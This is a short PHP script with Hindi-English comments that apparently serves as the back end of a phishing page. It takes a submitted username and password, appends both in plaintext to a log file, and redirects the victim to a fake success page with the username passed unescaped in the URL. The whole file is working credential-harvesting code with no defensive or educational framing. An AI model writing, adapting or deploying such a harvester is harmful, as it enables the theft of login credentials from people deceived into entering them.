<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Credentials ko save karna
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // Success page dikhana
    header("Location: success.html?username=$username");
    exit();
}
?>

